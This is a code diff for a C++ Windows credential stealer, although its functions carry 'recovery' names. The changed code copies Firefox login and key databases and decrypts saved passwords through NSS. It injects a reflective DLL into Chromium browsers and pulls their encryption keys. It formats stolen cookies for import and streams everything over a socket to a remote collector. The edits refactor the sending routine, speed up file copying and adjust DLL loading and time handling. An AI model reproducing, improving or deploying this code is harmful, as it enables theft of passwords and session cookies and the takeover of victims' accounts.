@@ -79,32 +79,34 @@ std::vector<unsigned char> base64_decode(std::string const& encoded_string) {
     return ret;
 }
 
+static bool send_all(SOCKET sock, const void* data, int len) {
+    const char* p = (const char*)data;
+    int totalSent = 0;
+    while (totalSent < len) {
+        int sent = send(sock, p + totalSent, len - totalSent, 0);
+        if (sent == SOCKET_ERROR) return false;
+        totalSent += sent;
+    }
+    return true;
+}
+
 // --- Helper for sending recovery data ---
 static bool send_recovery_data(SOCKET sock, const std::string& relPath, const void* data, size_t dataSize) {
     uint32_t pathLen = (uint32_t)relPath.size();
     uint32_t offset = 0;
     uint32_t payloadSize = 4 + pathLen + 4 + (uint32_t)dataSize;
 
-    std::vector<unsigned char> packet;
-    packet.resize(sizeof(PacketHeader) + payloadSize);
+    PacketHeader header;
+    header.signature = PACKET_SIGNATURE;
+    header.type = PACKET_TYPE_RECOVERY_FILE;
+    header.size = payloadSize;
 
-    PacketHeader* header = (PacketHeader*)packet.data();
-    header->signature = PACKET_SIGNATURE;
-    header->type = PACKET_TYPE_RECOVERY_FILE;
-    header->size = payloadSize;
-
-    unsigned char* p = packet.data() + sizeof(PacketHeader);
-    memcpy(p, &pathLen, 4); p += 4;
-    memcpy(p, relPath.c_str(), pathLen); p += pathLen;
-    memcpy(p, &offset, 4); p += 4;
-    if (dataSize > 0 && data) memcpy(p, data, dataSize);
-
-    int totalSent = 0;
-    int len = (int)packet.size();
-    while (totalSent < len) {
-        int sent = send(sock, (const char*)packet.data() + totalSent, len - totalSent, 0);
-        if (sent == SOCKET_ERROR) return false;
-        totalSent += sent;
+    if (!send_all(sock, &header, sizeof(header))) return false;
+    if (!send_all(sock, &pathLen, 4)) return false;
+    if (!send_all(sock, relPath.c_str(), (int)pathLen)) return false;
+    if (!send_all(sock, &offset, 4)) return false;
+    if (dataSize > 0 && data) {
+        if (!send_all(sock, data, (int)dataSize)) return false;
     }
     return true;
 }
@@ -114,7 +116,7 @@ static bool send_recovery_file(SOCKET sock, const std::string& relPath, const st
 }
 
 static bool send_recovery_json(SOCKET sock, const std::string& relPath, const json& j) {
-    std::string s = j.dump(4, ' ', false, nlohmann::json::error_handler_t::replace);
+    std::string s = j.dump(-1, ' ', false, nlohmann::json::error_handler_t::replace);
     return send_recovery_data(sock, relPath, s.data(), s.size());
 }
 
@@ -237,7 +239,7 @@ bool copy_file_locked(const fs::path& source, const fs::path& dest) {
                 CloseHandle(h_src); CloseHandle(h_dest); if (ok) return true;
             } else CloseHandle(h_src);
         }
-        if (i < 2) Sleep(50);
+        if (i < 2) Sleep(5);
     }
     return false;
 }
@@ -420,10 +422,8 @@ void collect_firefox(SOCKET sock, const BrowserConfig& browser) {
     if (b_exe.empty()) return;
     fs::path bin_dir = fs::path(b_exe).parent_path();
     HMODULE h_nss = NULL; NSSInit_t f_NSS_Init = nullptr; NSSShutdown_t f_NSS_Shutdown = nullptr; PK11SDRDecrypt_t f_PK11SDR_Decrypt = nullptr;
-    wchar_t saved_cwd[MAX_PATH]; GetCurrentDirectoryW(MAX_PATH, saved_cwd); SetCurrentDirectoryW(bin_dir.c_str());
-    h_nss = LoadLibraryW(L"nss3.dll");
+    h_nss = LoadLibraryExW((bin_dir / L"nss3.dll").c_str(), NULL, LOAD_WITH_ALTERED_SEARCH_PATH);
     if (h_nss) { f_NSS_Init = (NSSInit_t)GetProcAddress(h_nss, "NSS_Init"); f_NSS_Shutdown = (NSSShutdown_t)GetProcAddress(h_nss, "NSS_Shutdown"); f_PK11SDR_Decrypt = (PK11SDRDecrypt_t)GetProcAddress(h_nss, "PK11SDR_Decrypt"); }
-    SetCurrentDirectoryW(saved_cwd);
 
     wchar_t temp_base[MAX_PATH]; SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, temp_base);
     fs::path temp_dir = fs::path(temp_base) / "Temp" / ("firefox_db_" + std::to_string(GetTickCount())); fs::create_directories(temp_dir, ec);
@@ -436,7 +436,7 @@ void collect_firefox(SOCKET sock, const BrowserConfig& browser) {
         if (h_nss && f_NSS_Init && f_PK11SDR_Decrypt && f_NSS_Shutdown) {
             fs::path min_p = temp_dir / (p_name_sanit + "_nss"); fs::create_directories(min_p, ec);
             copy_file_locked(p_path / "key4.db", min_p / "key4.db"); copy_file_locked(p_path / "key3.db", min_p / "key3.db"); copy_file_locked(p_path / "cert9.db", min_p / "cert9.db"); copy_file_locked(p_path / "logins.json", min_p / "logins.json");
-            SetCurrentDirectoryW(bin_dir.c_str()); std::string p_str = min_p.string(); std::replace(p_str.begin(), p_str.end(), '\\', '/'); if (p_str.back() == '/') p_str.pop_back();
+            std::string p_str = min_p.string(); std::replace(p_str.begin(), p_str.end(), '\\', '/'); if (p_str.back() == '/') p_str.pop_back();
             bool inited = false; if (fs::exists(min_p / "key4.db")) { if (f_NSS_Init(("sql:" + p_str).c_str()) == SECSuccess) inited = true; }
             if (inited) {
                 fs::path login_f = min_p / "logins.json"; if (fs::exists(login_f)) {
@@ -460,7 +460,6 @@ void collect_firefox(SOCKET sock, const BrowserConfig& browser) {
                 }
                 f_NSS_Shutdown();
             }
-            SetCurrentDirectoryW(saved_cwd);
         }
         fs::path c_db = p_path / "cookies.sqlite"; fs::path tc_db = temp_dir / (p_name_sanit + "_cook.tmp");
         if (copy_db_with_sidecars(c_db, tc_db)) { sqlite3* db; if (open_db_for_extraction(wstring_to_utf8(tc_db.wstring()), &db, true) == SQLITE_OK) { sqlite3_stmt* stmt; if (sqlite3_prepare_v2(db, "SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies", -1, &stmt, nullptr) == SQLITE_OK) { p_data.cookies.reserve(500); while (sqlite3_step(stmt) == SQLITE_ROW) p_data.cookies.push_back({ get_sqlite_text(stmt, 0), get_sqlite_text(stmt, 1), get_sqlite_text(stmt, 2), get_sqlite_text(stmt, 3), (sqlite3_column_int64(stmt, 4) + 11644473600LL) * 1000000, sqlite3_column_int(stmt, 5), sqlite3_column_int(stmt, 6), 0 }); sqlite3_finalize(stmt); } sqlite3_close(db); } cleanup_db_temp(tc_db); }
@@ -491,7 +490,7 @@ void collect_firefox(SOCKET sock, const BrowserConfig& browser) {
                     ss_cook << "Host: " << c.host << " | Name: " << c.name << " | Value: " << c.value << "\n";
                     json cj; std::string hr = c.host; if (hr.find("http") != 0) hr = "https://" + (hr[0] == '.' ? hr.substr(1) : hr); if (hr.back() != '/') hr += "/";
                     cj["Host raw"] = ensure_utf8(hr); cj["Name raw"] = ensure_utf8(c.name); cj["Path raw"] = ensure_utf8(c.path); cj["Content raw"] = ensure_utf8(c.value);
-                    long long ut = (c.expires_utc / 1000000) - 11644473600LL; std::time_t t = (std::time_t)ut; struct tm *tmp = std::gmtime(&t); char dbuf[64]; if (tmp && std::strftime(dbuf, sizeof(dbuf), "%d-%m-%Y %H:%M:%S", tmp)) cj["Expires"] = std::string(dbuf);
+                    long long ut = (c.expires_utc / 1000000) - 11644473600LL; std::time_t t = (std::time_t)ut; struct tm _tm; struct tm *tmp = nullptr; if (_gmtime64_s(&_tm, &t) == 0) tmp = &_tm; char dbuf[64]; if (tmp && std::strftime(dbuf, sizeof(dbuf), "%d-%m-%Y %H:%M:%S", tmp)) cj["Expires"] = std::string(dbuf);
                     cj["Expires raw"] = std::to_string(ut); cj["Send for"] = c.is_secure ? "Encrypted connections only" : "Any type of connection"; cj["Send for raw"] = c.is_secure ? "true" : "false"; cj["HTTP only raw"] = c.is_httponly ? "true" : "false"; cj["SameSite raw"] = "no_restriction"; cj["This domain only"] = (c.host[0] == '.') ? "false" : "true"; j_cook.push_back(cj);
                 }
                 send_recovery_text(sock, "browsers/" + b_name_utf8 + "/" + p_name_sanit + "/cookies.txt", ss_cook.str());
@@ -546,7 +545,7 @@ void inject_and_collect(SOCKET sock, const std::vector<unsigned char>& dll, cons
         }
     }
     HANDLE h_pipe = INVALID_HANDLE_VALUE;
-    if (browser.use_injection) { h_pipe = CreateNamedPipeW(L"\\\\.\\pipe\\chrome_extractor", PIPE_ACCESS_INBOUND | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 1, 50 * 1024 * 1024, 50 * 1024 * 1024, 0, NULL); if (!dll.empty()) inject_dll_reflective(h_proc, dll); if (started) { ResumeThread(pi.hThread); Sleep(500); } }
+    if (browser.use_injection) { h_pipe = CreateNamedPipeW(L"\\\\.\\pipe\\chrome_extractor", PIPE_ACCESS_INBOUND | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 1, 50 * 1024 * 1024, 50 * 1024 * 1024, 0, NULL); if (!dll.empty()) inject_dll_reflective(h_proc, dll); if (started) { ResumeThread(pi.hThread); } }
     std::vector<unsigned char> v10, v20;
     try {
         std::ifstream f(data / "Local State");
@@ -608,7 +607,7 @@ void inject_and_collect(SOCKET sock, const std::vector<unsigned char>& dll, cons
                     ss_c << "Host: " << i.host << " | Name: " << i.name << " | Value: " << i.value << "\n";
                     json cj; std::string hr = i.host; if (hr.find("http") != 0) hr = "https://" + (hr[0] == '.' ? hr.substr(1) : hr); if (hr.back() != '/') hr += "/";
                     cj["Host raw"] = ensure_utf8(hr); cj["Name raw"] = ensure_utf8(i.name); cj["Path raw"] = ensure_utf8(i.path); cj["Content raw"] = ensure_utf8(i.value);
-                    long long ut = (i.expires_utc / 1000000) - 11644473600LL; std::time_t t = (std::time_t)ut; struct tm *tmp = std::gmtime(&t); char dbuf[64]; if (tmp && std::strftime(dbuf, sizeof(dbuf), "%d-%m-%Y %H:%M:%S", tmp)) cj["Expires"] = std::string(dbuf);
+                    long long ut = (i.expires_utc / 1000000) - 11644473600LL; std::time_t t = (std::time_t)ut; struct tm _tm; struct tm *tmp = nullptr; if (_gmtime64_s(&_tm, &t) == 0) tmp = &_tm; char dbuf[64]; if (tmp && std::strftime(dbuf, sizeof(dbuf), "%d-%m-%Y %H:%M:%S", tmp)) cj["Expires"] = std::string(dbuf);
                     cj["Expires raw"] = std::to_string(ut); cj["Send for"] = i.is_secure ? "Encrypted connections only" : "Any type of connection"; cj["Send for raw"] = i.is_secure ? "true" : "false"; cj["HTTP only raw"] = i.is_httponly ? "true" : "false"; cj["SameSite raw"] = "no_restriction"; cj["This domain only"] = (i.host[0] == '.') ? "false" : "true"; j_c.push_back(cj);
                 }
                 send_recovery_text(sock, "browsers/" + b_name_utf8 + "/" + p_san + "/cookies.txt", ss_c.str());
